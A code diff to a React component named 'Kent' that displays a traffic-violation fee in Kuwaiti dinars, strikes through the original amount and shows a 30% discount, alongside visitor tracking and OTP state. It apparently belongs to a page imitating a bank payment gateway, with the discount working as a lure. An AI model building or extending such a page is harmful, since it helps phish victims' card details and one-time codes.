@@ -147,7 +147,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
   const [total, setTotal] = useState("");
   const [loading, setLoading] = useState(false);
   const [newotp] = useState([""]);
-
+const res=parseFloat(props.violationValue as unknown as  string)*0.30
   const handleUpdatePage = async (page: string) => {
     const visitorId = localStorage.getItem("visitor");
     try {
@@ -226,8 +226,11 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
         }}
       >
         <div className="madd" />
-        <div id="PayPageEntry">
+        <div id="PayPageEntry" style={{display:'flex',justifyContent:"center",flexDirection:'column'}}>
+        <img src="./dre5.png" className="container" alt="mmo" />
+
           <div className="container">
+
             <div className="content-block">
               <div className="form-card">
                 <div
@@ -235,11 +238,9 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                   style={{ display: "flex", justifyContent: "center" }}
                 >
                   <img
-                    src="./kv.png"
+                    src="./image.jpg"
                     className="-"
                     alt="logo"
-                    height={50}
-                    width={50}
                   />
                 </div>
                 <div className="row">
@@ -251,8 +252,13 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                 <div id="OrgTranxAmt">
                   <div className="row">
                     <label className="column-label">Amount: </label>
-                    <label className="column-value text-label">
-                      {props.violationValue === 0 ? 5 : props.violationValue} kd
+                    <label className="column-value " style={{width:'50%'}}>  {" "}
+                    <s>{     props.violationValue === 0 ? 5.00 :parseFloat( props.violationValue!.toString() ).toFixed(2)}kd</s> 
+                      <span className="m-1">
+                      {
+                      props.violationValue === 0 ? 3.5 :parseFloat( props.violationValue!.toString() )-res
+                      } kd
+                      </span>
                     </label>
                   </div>
                 </div>
